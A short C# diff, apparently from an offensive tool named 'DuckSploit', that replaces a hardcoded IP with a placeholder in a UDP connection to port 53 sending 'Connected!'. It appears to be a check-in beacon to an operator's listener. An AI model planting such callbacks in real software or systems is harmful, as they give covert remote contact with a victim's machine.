@@ -95,7 +95,7 @@ namespace DuckSploit
 			UdpClient udpClient = new UdpClient(0);
 
 			try{
-				udpClient.Connect("192.168.1.47", 53);
+				udpClient.Connect("IP", 53);
 
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");
 
